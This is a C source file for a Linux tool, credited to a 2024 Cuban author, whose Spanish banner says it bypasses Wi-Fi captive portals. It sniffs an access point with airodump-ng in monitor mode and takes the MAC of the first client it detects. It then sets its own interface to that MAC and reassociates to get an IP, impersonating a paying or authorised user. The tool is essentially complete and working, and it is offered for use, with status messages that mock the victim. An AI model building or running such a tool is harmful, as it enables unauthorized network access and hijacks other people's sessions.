
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>


const char *read_val(const char *key);
void asotiation(void);
void *realasoc(void *data);
void dhcp_update(void);
void *realdhcp(void *data);
void monitor(void);
const char *detect_cli(void);
void sentinel_cli(void);
void *realsentinel(void *data);
void change_mac(const char *mac);
void write_status(const char *val);

static struct WIFI
{
  char rate[5000];
  char ssid[5000];
  char gateway[5000];
  char ap[5000];
  char channel[5000];
  char interface[5000];
  char client[5000];
  char fakemac[5000];
  unsigned short int flag_ok;
  unsigned short int flag_end;
  unsigned short int flag_client;
} wifi;

int main(int argc, char *argv[])
{

  char cad[5000] = {'\0'};

  system("clear");
  system("pkill ping");
  system("pkill dhclient");
  system("pkill airodump");

  strcpy(wifi.rate, read_val("rate"));
  strcpy(wifi.ssid, read_val("ssid"));
  strcpy(wifi.gateway, read_val("gateway"));
  strcpy(wifi.ap, read_val("ap"));
  strcpy(wifi.interface, read_val("interface"));
  strcpy(wifi.channel, read_val("channel"));
  strcpy(wifi.fakemac, read_val("fakemac"));

  printf("***   Programa para burlar portales cautivos   *** \n");
  printf("***                Creado por                  *** \n");
  printf("***         Haylem Candelario Bauza            *** \n");
  printf("***       2024. Cuba. Software Libre GPLv2     *** \n");

  printf("\n[_] Datos actuales:\n\n");
  printf("[-] Interface a conectar: %s\n", wifi.interface);
  printf("[-] Bit rate: %s\n", wifi.rate);
  printf("[-] Nombre de WIFI: %s\n", wifi.ssid);
  printf("[-] Pasarela %s\n", wifi.gateway);
  printf("[-] Ap a enlazar %s\n", wifi.ap);
  printf("[-] Canal de AP a monitorizar %s\n", wifi.channel);
  printf("[-] MAC real o falsa de mi wifi para restaurar %s\n\n", wifi.fakemac);
  printf("--------------------------------------------\n\n");

  wifi.flag_end = 0;
  sentinel_cli(); /* No bloqueante */
  write_status("Capturando peces...");
  monitor();      /* Bloqueante */

  if(wifi.client[0] != '\0')
  {
    sprintf(cad, "Detectado cliente - %s -\nAplicando MAC...", wifi.client);
    write_status(cad);
  }

  change_mac(wifi.client);
  write_status("MAC aplicada!!!");
  asotiation();
  dhcp_update();

  while(1) sleep(5);

  wifi.flag_end = 0;

  system("pkill ping");
  system("pkill dhclient");
  system("pkill airodump");
  change_mac(wifi.fakemac);

  printf("\n[*] OK\n\n");

  return 0;
}

void change_mac(const char *mac)
{
  char cmd[5000] = {'\0'};
  char cad[5000] = {'\0'};

  if(mac[0] == '\0') return;

  sleep(2);
  sprintf(cmd, "ip link set dev %s down", wifi.interface);
  system(cmd); sleep(3);

  sprintf(cmd, "iw dev %s set type managed", wifi.interface);
  system(cmd); sleep(1);


  sprintf(cad, "Estoy aplicando la MAC del cliente %s", mac);
  write_status(cad);

  sprintf(cmd, "ifconfig %s hw ether %s", wifi.interface, mac);
  system(cmd); sleep(2);

  /*sprintf(cmd, "ip link set %s address %s", wifi.interface, mac);
  system(cmd); sleep(1);*/

  sprintf(cmd, "ip link set dev %s up", wifi.interface);
  system(cmd); sleep(3);
  write_status("Cliente suplantado!!!.");

}

void sentinel_cli(void)
{
  pthread_t hilo;

  pthread_create(&hilo, NULL, realsentinel, NULL);

}

void monitor(void)
{
  char cmd[5000] = {'\0'};

  wifi.flag_client = 0;

  system("rm -r /tmp/robotcap 2>/dev/null");
  system("mkdir /tmp/robotcap 2>/dev/null");

  sprintf(cmd, "ip link set dev %s down", wifi.interface);
  system(cmd); sleep(3);

  write_status("Activando el radar!!!...");
  sprintf(cmd, "iw dev %s set type monitor", wifi.interface);
  system(cmd); sleep(3);

  sprintf(cmd, "ip link set dev %s up", wifi.interface);
  system(cmd); sleep(3);
  write_status("Radar activado [ - ]");

  sprintf(cmd, "airodump-ng %s --bssid %s --channel %s -w /tmp/robotcap/cap", \
                wifi.interface, wifi.ap, wifi.channel);

  system(cmd); sleep (3);

  sprintf(cmd, "ip link set dev %s down", wifi.interface);
  system(cmd); sleep(3);


  sprintf(cmd, "iw dev %s set type managed", wifi.interface);
  system(cmd); sleep(3);


  sprintf(cmd, "ip link set dev %s up", wifi.interface);
  system(cmd); sleep(3);

  write_status("Se ha detectado un infeliz!!!.");


}

void dhcp_update(void)
{
  pthread_t hilo;

  pthread_create(&hilo, NULL, realdhcp, NULL);

}


void asotiation(void)
{
  pthread_t hilo;

  pthread_create(&hilo, NULL, realasoc, NULL);
}


void *realsentinel(void *data)
{
  char client[5000] = {'\0'};

  while(1)
  {
    if(wifi.flag_client == 1) break;
    if(wifi.flag_end == 1) break;

    sleep(3);
    strcpy(client, detect_cli());
    if((client[0] == '-') || (client[0] == '\0') || strlen(client) < 17)
    {
      continue;
    }
    else
    {
      system("pkill airodump");
      printf("\n[-] Cliente detectado %s\n\n", client);
      strcpy(wifi.client, client);
      wifi.flag_client = 1;
    }
  }
}

void *realdhcp(void *data)
{
  char cmd[5000] = {'\0'};


  system("pkill dhclient");
  sprintf(cmd, "dhclient -i %s -r", wifi.interface);
  system(cmd);

  sprintf(cmd, "dhclient -i %s -v 2>&1|grep 'bound to'", wifi.interface);
  while(system(cmd) != 0)
  {
    sleep(5);
  }

  wifi.flag_ok = 1;

  write_status("IP obtenida [OK]");

  system("pkill ping");
  system("ping google.com");

}

void *realasoc(void *data)
{
  char cmd[5000] = {'\0'};

  system("iw reg set US");

  sprintf(cmd, "iwconfig %s rate 1M", wifi.interface);
  system(cmd);
  sleep(2);


  sprintf(cmd, "iwconfig %s txpower 30dBm",  wifi.interface);
  system(cmd);
  sleep(2);


  while(1)
  {

    sprintf(cmd, "iwconfig %s essid %s channel %s ap %s", wifi.interface,\
             wifi.ssid, wifi.channel, wifi.ap);

    system(cmd);
    sleep(5);

  }

}

const char *read_val(const char *key)
{
  FILE *f = NULL;
  char data[5000] = {'\0'};
  char *token = NULL;
  char *token2 = NULL;

  f = fopen("./robot.cfg", "r");

  if(f == NULL) return "---";

  fgets(data, sizeof(data), f);
  while(!feof(f))
  {
    data[strlen(data) - 1] = '\0';

    token = strtok(data, "=");
    if(token != NULL)
    {

      if(strcmp(token, key) == 0)
      {
        token2 = strtok(NULL, "=");
        break;
      }

    }

    fgets(data, sizeof(data), f);
  }
  fclose(f);
  return strdup(token2);
}

const char *detect_cli(void)
{
  FILE *f = NULL;
  char data[5000] = {'\0'};
  char *tok = NULL;

  f = fopen("/tmp/robotcap/cap-01.csv", "r");
  if(f == NULL) return "---";

  fgets(data, sizeof(data), f);
  while(!feof(f))
  {
    data[strlen(data) - 1 ] = '\0';

    if(strstr(strdup(data), "Station MAC") != NULL)
    {
      fgets(data, sizeof(data), f);
      tok = strtok(data, ",");
      if(tok != NULL)
      {
        fclose(f);
        return tok;
      }
    }
    fgets(data, sizeof(data), f);
  }
  fclose(f);
  return "---";
}

void write_status(const char *val)
{
  FILE *f = NULL;

  f = fopen("status", "w");
  fprintf(f, "%s\n", val);
  fclose(f);
}
